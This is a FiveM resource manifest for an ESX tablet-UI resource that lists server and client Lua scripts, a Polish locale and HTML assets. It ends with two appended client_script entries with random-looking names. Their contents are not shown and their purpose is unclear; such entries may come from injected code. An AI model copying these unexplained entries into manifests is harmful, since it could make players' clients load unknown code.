fx_version 'adamant'
games { 'gta5' }

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locates/pl.lua',
	'config.lua',
	'server.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locates/pl.lua',
	'config.lua',
	'client/client.lua'
}

ui_page('client/html/UI.html')

files({
    'client/html/UI.html',
    'client/html/style.css',
	'client/html/tablet.png'
})
client_script "api-ac_CdgzHpsEhDhX.lua"
client_script "api-ac_vJaFYnGsavCO.lua"